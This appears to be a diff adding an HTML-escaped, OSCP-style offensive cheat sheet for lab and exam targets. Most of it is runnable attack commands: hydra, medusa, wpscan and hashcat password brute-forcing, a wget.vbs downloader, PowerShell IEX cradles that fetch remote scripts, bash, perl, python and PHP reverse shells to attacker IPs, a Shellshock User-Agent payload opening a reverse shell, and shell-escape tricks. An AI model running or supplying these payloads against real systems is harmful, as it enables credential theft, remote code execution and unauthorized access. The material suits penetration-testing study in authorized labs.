+&lt;h4&gt;Make paswords from a webpage&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cewl http://10.10.10.10 -m &lt;span class="m"&gt;6&lt;/span&gt; -w mac.txt
+nano /etc/john/john.conf
+&lt;span class="c1"&gt;# Add two numbers to end of each password&lt;/span&gt;
+$&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;-9&lt;span class="o"&gt;]&lt;/span&gt;$&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;-9&lt;span class="o"&gt;]&lt;/span&gt;
+john --wordlist&lt;span class="o"&gt;=&lt;/span&gt;mac.txt --rules --stdout &amp;gt;mutated.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Generate passwords with crunch&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;crunch &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; -f /usr/share/crunch/charset.list mixalpha -p passwords.txt
+crunch &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="m"&gt;8&lt;/span&gt; -t,@@^^%%%
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;hydra attack&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# -t TASKS... run TASKS number of connects in parallel per target (default: 16)&lt;/span&gt;
+hydra -l username -P mac.txt &lt;span class="m"&gt;10&lt;/span&gt;.10.10.10 -t &lt;span class="m"&gt;4&lt;/span&gt; -v ssh
+hydra -l sunny -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt ssh://10.10.10.76:22022
+hydra -l username -P mac.txt &lt;span class="m"&gt;10&lt;/span&gt;.10.10.10 -v snmp
+hydra -l username -P mac.txt &lt;span class="m"&gt;10&lt;/span&gt;.10.10.10 -v ftp
+hydra -l username -P mac.txt &lt;span class="m"&gt;10&lt;/span&gt;.10.10.10 -v pop3
+hydra -l username -P mac.txt &lt;span class="m"&gt;10&lt;/span&gt;.10.10.10 -v smtp
+hydra -l username -P mac.txt rdp://10.10.10.10 -v smb
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/
+manager/html
+&lt;span class="nv"&gt;HYDRA_PROXY_HTTP&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://127.0.0.1:8080 hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcatbetterdefaultpasslist.txt -s &lt;span class="m"&gt;8080&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.95 http-get /manager/html
+hydra -l falaraki -P list.txt apocalyst.htb http-post-form “/wp-login.php:log&lt;span class="o"&gt;=&lt;/span&gt;^USER^&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;pwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;^PASS^&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;wp-submit&lt;span class="o"&gt;=&lt;/span&gt;Log
+In&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;redirect_to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://apocalyst.htb/wp-admin/&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;testcookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;:is incorrect”
+hydra -V -L userlist.txt -p superpassword &lt;span class="m"&gt;10&lt;/span&gt;.10.11.174 http-post-form &lt;span class="s1"&gt;&amp;#39;wp/login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wpsubmit=Log+In:F=Invalid User&amp;#39;&lt;/span&gt;
+hydra -l falaraki -P list.txt apocalyst.htb http-post-form &lt;span class="s2"&gt;&amp;quot;/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wpsubmit=Log+In&amp;amp;redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&amp;amp;testcookie=1:is incorrect&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;apocalyst&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;patator for SSH&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;patator ssh_login &lt;span class="nv"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.76 &lt;span class="nv"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;22022&lt;/span&gt; &lt;span class="nv"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;sunny &lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;FILE0 &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/probable-v2-
+top1575.txt &lt;span class="nv"&gt;persistent&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; -x ignore:mesg&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Authentication failed.&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;medusa attack&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;medusa -h &lt;span class="m"&gt;10&lt;/span&gt;.11.1.219 -u admin -P password.txt -M http -m DIR:/admin -T &lt;span class="m"&gt;10&lt;/span&gt;
+medusa -h admin.megacorpone.com -u admin -P mangled.txt -M http -n &lt;span class="m"&gt;81&lt;/span&gt; -m DIR:/admin -T &lt;span class="m"&gt;30&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;wpscan attack&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ruby wpscan.rb --u &lt;span class="m"&gt;10&lt;/span&gt;.10.10.10 --threads &lt;span class="m"&gt;20&lt;/span&gt; --wordlist rockyou.txt --username admin
+wpscan --url http://apocalyst.htb --wordlist &lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;/list.txt --username falaraki &lt;span class="o"&gt;(&lt;/span&gt;apocalyst&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Password-protected zip files&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;fcrackzip -u -D -p rockyou.txt filename.zip
+john hashes.txt --format&lt;span class="o"&gt;=&lt;/span&gt;nt --wordlist&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;wfuzz attack&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# -c : Output with colors&lt;/span&gt;
+&lt;span class="c1"&gt;# --hc/hl/hw/hh N[,N]+ : Hide responses with the specified code/lines/words/chars&lt;/span&gt;
+&lt;span class="c1"&gt;# -d postdata : Use post data (ex: &amp;quot;id=FUZZ&amp;amp;catalogue=1&amp;quot;)&lt;/span&gt;
+wfuzz -c -w passwords.txt --hs&lt;span class="o"&gt;(&lt;/span&gt;or hw&lt;span class="o"&gt;)&lt;/span&gt; Invalid -d “log&lt;span class="o"&gt;=&lt;/span&gt;admin&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;pwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;FUZZ” -u http://192.168.39.155/wp-login.php
+wfuzz -c --hw &lt;span class="m"&gt;114&lt;/span&gt; -w /usr/share/wfuzz/wordlist/general/megabeast.txt &lt;span class="s2"&gt;&amp;quot;192.168.39.155:8787/?page=FUZZ&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;RDP&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ncrack -vv --user admin -P password.txt rdp://10.10.10.11
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;hashcat&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# paste the hash into querier.ntlmv2&lt;/span&gt;
+.&lt;span class="se"&gt;\h&lt;/span&gt;ashcat64.exe --example-hashes
+.&lt;span class="se"&gt;\h&lt;/span&gt;ashcat64.exe -m &lt;span class="m"&gt;5600&lt;/span&gt; hashes&lt;span class="se"&gt;\q&lt;/span&gt;uerier.ntlmv2 rockyou.txt --force
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Encryption&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bruteforce-salted-openssl -t &lt;span class="m"&gt;10&lt;/span&gt; -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d sha256 encrypted
+Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
+Tried passwords: &lt;span class="m"&gt;22&lt;/span&gt;
+Tried passwords per second: inf
+Last tried password: &lt;span class="m"&gt;1234567890&lt;/span&gt;
+Password candidate: friends
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Unzip&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;7z x &lt;span class="s1"&gt;&amp;#39;Access Control.zip&amp;#39;&lt;/span&gt;
+Password: access4u@security
+zip2john &lt;span class="s1"&gt;&amp;#39;Access Control.zip&amp;#39;&lt;/span&gt; &amp;gt; &lt;span class="s1"&gt;&amp;#39;Access.hash&amp;#39;&lt;/span&gt;
+john &lt;span class="s1"&gt;&amp;#39;Access.hash&amp;#39;&lt;/span&gt; --wordlist&lt;span class="o"&gt;=&lt;/span&gt;wordlist
+john &lt;span class="s1"&gt;&amp;#39;Access.hash&amp;#39;&lt;/span&gt; --show
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;File Transfers&lt;/h3&gt;
+&lt;h4&gt;nc/ncat&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -nlvp &lt;span class="m"&gt;4444&lt;/span&gt; &amp;gt; incoming.exe
+nc -nv ip_address &lt;span class="m"&gt;4444&lt;/span&gt; &amp;lt; incoming.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;wget.vbs&lt;/h4&gt;
+&lt;p&gt;The &lt;code&gt;wget.vbs&lt;/code&gt; script that is uploaded to a Windows machine looks like this!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cscript wget.vbs http://10.10.10.10/evil.exe evil.exe
+&lt;span class="nv"&gt;strUrl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; WScript.Arguments.Item&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nv"&gt;StrFile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; WScript.Arguments.Item&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+Const &lt;span class="nv"&gt;HTTPREQUEST_PROXYSETTING_DEFAULT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+Const &lt;span class="nv"&gt;HTTPREQUEST_PROXYSETTING_PRECONFIG&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+Const &lt;span class="nv"&gt;HTTPREQUEST_PROXYSETTING_DIRECT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
+Const &lt;span class="nv"&gt;HTTPREQUEST_PROXYSETTING_PROXY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts
+Err.Clear
+Set &lt;span class="nv"&gt;http&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Nothing
+Set &lt;span class="nv"&gt;http&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; CreateObject&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WinHttp.WinHttpRequest.5.1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+If http Is Nothing Then Set &lt;span class="nv"&gt;http&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; CreateObject&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WinHttp.WinHttpRequest&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+If http Is Nothing Then Set &lt;span class="nv"&gt;http&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; CreateObject&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;MSXML2.ServerXMLHTTP&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+If http Is Nothing Then Set &lt;span class="nv"&gt;http&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; CreateObject&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Microsoft.XMLHTTP&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+http.Open &lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;, strURL, False
+http.Send
+&lt;span class="nv"&gt;varByteArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; http.ResponseBody
+Set &lt;span class="nv"&gt;http&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Nothing
+Set &lt;span class="nv"&gt;fs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; CreateObject&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Scripting.FileSystemObject&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+Set &lt;span class="nv"&gt;ts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; fs.CreateTextFile&lt;span class="o"&gt;(&lt;/span&gt;StrFile, True&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nv"&gt;strData&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="nv"&gt;strBuffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+For &lt;span class="nv"&gt;lngCounter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; to UBound&lt;span class="o"&gt;(&lt;/span&gt;varByteArray&lt;span class="o"&gt;)&lt;/span&gt;
+ts.Write Chr&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;255&lt;/span&gt; And Ascb&lt;span class="o"&gt;(&lt;/span&gt;Midb&lt;span class="o"&gt;(&lt;/span&gt;varByteArray,lngCounter + &lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)))&lt;/span&gt;
+Next
+ts.Close
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Powershell&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;powershell “IEX&lt;span class="o"&gt;(&lt;/span&gt;New-Object NetWebClient&lt;span class="o"&gt;)&lt;/span&gt;.downloadString&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://10.10.14.7:8000/InvokePowerShellTcp.ps1&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;”
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;curl&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl localhost/filename
+base64
+cat file2upload &lt;span class="p"&gt;|&lt;/span&gt; base64
+cat fileWithBase64Content &lt;span class="p"&gt;|&lt;/span&gt; base64 -d &amp;gt; finalBinary
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;FTP&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# setup&lt;/span&gt;
+apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get install pure-ftpd
+/etc/init.d/pure-ftpd -j -l puredb:/etc/pure-ftpd/pureftpd.pdb &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
+
+&lt;span class="c1"&gt;# Non-interactive FTP&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; open &lt;span class="m"&gt;10&lt;/span&gt;.10.10.10 &lt;span class="m"&gt;21&lt;/span&gt;&amp;gt; ftp.txt
+&lt;span class="nb"&gt;echo&lt;/span&gt; USER username&amp;gt;&amp;gt; ftp.txt
+&lt;span class="nb"&gt;echo&lt;/span&gt; mypassword&amp;gt;&amp;gt; ftp.txt
+&lt;span class="nb"&gt;echo&lt;/span&gt; bin&amp;gt;&amp;gt; ftp.txt
+&lt;span class="m"&gt;30&lt;/span&gt;/67
+&lt;span class="nb"&gt;echo&lt;/span&gt; GET filename&amp;gt;&amp;gt;ftp.txt
+&lt;span class="nb"&gt;echo&lt;/span&gt; bye&amp;gt;&amp;gt; ftp.txt
+ftp -s&lt;span class="p"&gt;;&lt;/span&gt; ftp.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;TFTP&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Setup TFTP server&lt;/span&gt;
+mkdir /tftp
+atftpd --daemon --port &lt;span class="m"&gt;69&lt;/span&gt; /tftp
+nmap -sU localhost
+cp /usr/share/windows-binaries/nc.exe /tftp/
+FROM WINDOWS tftp -i kali_ip_address get nc.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;debug.exe (32bit)&lt;/h4&gt;
+&lt;p&gt;Debug is an assembler, disassembler, and a hex dumping tool &amp;lt;64K file size&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# compress&lt;/span&gt;
+upx -9 nc.exe
+
+&lt;span class="c1"&gt;# now convert to txt with exe2bat&lt;/span&gt;
+locate exe2bat&lt;span class="p"&gt;;&lt;/span&gt; 
+cp /usr/share/windows-binaries/exe2bat.exe
+wine exe2bat.exe nc.exe nc.txt
+
+&lt;span class="c1"&gt;# Copy and paste this txt file into victim shell&lt;/span&gt;
+&lt;span class="c1"&gt;# → Gives a 1.dll then nc.exe&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Shells&lt;/h3&gt;
+&lt;h4&gt;Common reverse shells&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls -l /usr/share/webshells
+cat /etc/shells &lt;span class="c1"&gt;# list shells available&lt;/span&gt;
+&lt;span class="nv"&gt;rbash&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; restricted bash. Can sometimes just &lt;span class="nb"&gt;type&lt;/span&gt; bash to escape it
+ls -lah /bin/sh &lt;span class="c1"&gt;#  Bash installed - dash, why?&lt;/span&gt;
+ncat &lt;span class="o"&gt;(&lt;/span&gt;reverse shell&lt;span class="o"&gt;)&lt;/span&gt;
+ncat –lvp &lt;span class="m"&gt;4444&lt;/span&gt; –allow win_ip –ssl   ncat –v linux_ip &lt;span class="m"&gt;4444&lt;/span&gt; –e cmd.exe --ssl
+sbd &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bind&lt;/span&gt; only shell&lt;span class="o"&gt;)&lt;/span&gt;
+sbd –l –p &lt;span class="m"&gt;4444&lt;/span&gt; –e cmd.exe –v –n sbd windows_ip &lt;span class="m"&gt;4444&lt;/span&gt;
+Bash
+bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.0.0.1/8080 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
+bash ‘bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.0.0.1/8080 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;’
+PERL
+perl -e &lt;span class="s1"&gt;&amp;#39;use Socket;$i=&amp;quot;10.0.0.1&amp;quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&amp;#39;&lt;/span&gt;
+Python
+python –c ‘import pty&lt;span class="p"&gt;;&lt;/span&gt; pty.spawn&lt;span class="o"&gt;(&lt;/span&gt;“/bin/sh”&lt;span class="o"&gt;)&lt;/span&gt;’
+python -c &lt;span class="s1"&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.0.0.1&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#39;&lt;/span&gt;
+PHP
+&amp;lt;?php shell_exec&lt;span class="o"&gt;(&lt;/span&gt;‘bash –I &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.11.0.165/1234 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;’&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; ?&amp;gt;
+The following assumes TCP connection uses file descriptor &lt;span class="m"&gt;3&lt;/span&gt;.  If it doesn’t work, try &lt;span class="m"&gt;4&lt;/span&gt;, &lt;span class="m"&gt;5&lt;/span&gt;, &lt;span class="m"&gt;6&lt;/span&gt;…
+php -r &lt;span class="s1"&gt;&amp;#39;$sock=fsockopen(&amp;quot;10.0.0.1&amp;quot;,1234); exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Shellshock&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;x&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;() { :;}; echo VULNERABLE&amp;#39;&lt;/span&gt; bash -c : VULNERABLE
+VULNERABLE &lt;span class="c1"&gt;# prints VULNERABLE if vulnerable&lt;/span&gt;
+curl -H &lt;span class="s2"&gt;&amp;quot;User-Agent: () { :; }; /bin/bash -c &amp;#39;echo aaaa; &lt;/span&gt;
+&lt;span class="s2"&gt;          bash -i &amp;gt;&amp;amp; /dev/tcp/10.11.0.165/443 0&amp;gt;&amp;amp;1; echo zzzz;’”   &lt;/span&gt;
+&lt;span class="s2"&gt;          http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n &amp;#39;/aaaa/{:a;n;/zzzz/b;p;ba}’  &lt;/span&gt;
+&lt;span class="s2"&gt;Test for shellshock &lt;/span&gt;
+&lt;span class="s2"&gt;nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi &lt;/span&gt;&lt;span class="nv"&gt;$ip&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="image" src="/assets/images/oscp/shellshock.png" title="shellshock"&gt;&lt;/p&gt;
+&lt;h4&gt;Shell escape sequences&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;:!bash &lt;span class="c1"&gt;# vi, vim&lt;/span&gt;
+:set &lt;span class="nv"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/bash:shell &lt;span class="c1"&gt;# vi, vim&lt;/span&gt;
+!bash &lt;span class="c1"&gt;# man, more, less&lt;/span&gt;
+find / -exec /usr/bin/awk &lt;span class="s1"&gt;&amp;#39;BEGIN {system(&amp;quot;/bin/bash&amp;quot;)}’ ;  # find&lt;/span&gt;
+&lt;span class="s1"&gt;awk &amp;#39;&lt;/span&gt;BEGIN &lt;span class="o"&gt;{&lt;/span&gt;system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)}&lt;/span&gt;’ &lt;span class="c1"&gt;# awk&lt;/span&gt;
+--interactive &lt;span class="c1"&gt;# nmap&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;os.execute(&amp;#39;/bin/sh&amp;#39;)&amp;quot;&lt;/span&gt; &amp;gt; exploit.nse sudo nmap --script&lt;span class="o"&gt;=&lt;/span&gt;exploit.nse &lt;span class="c1"&gt;# nmap &lt;/span&gt;
+perl -e &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nb"&gt;exec&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;’ &lt;span class="c1"&gt;# Perl&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Upgrade *nix shell&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# In reverse shell &lt;/span&gt;
+python -c &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
+Ctrl-Z 
+
+&lt;span class="c1"&gt;# In Kali &lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$TERM&lt;/span&gt;
+stty raw -echo 
+&lt;span class="nb"&gt;fg&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Upgrade Windows shell&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# If already in a shell on Windows… test for poweshell&lt;/span&gt;
+powershell whoami
+
+locate Invoke-PowershellTcp.ps1
+&lt;span class="c1"&gt;# Cut PS &amp;gt; Invoke… line in script and paste to bottom&lt;/span&gt;
+
+&lt;span class="c1"&gt;# Serve to victim&lt;/span&gt;
+powershell “IEX&lt;span class="o"&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class="o"&gt;)&lt;/span&gt;.downloadString&lt;span class="o"&gt;(&lt;/span&gt;‘http://kali:9999/nishang.ps1’&lt;span class="o"&gt;)&lt;/span&gt;”
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
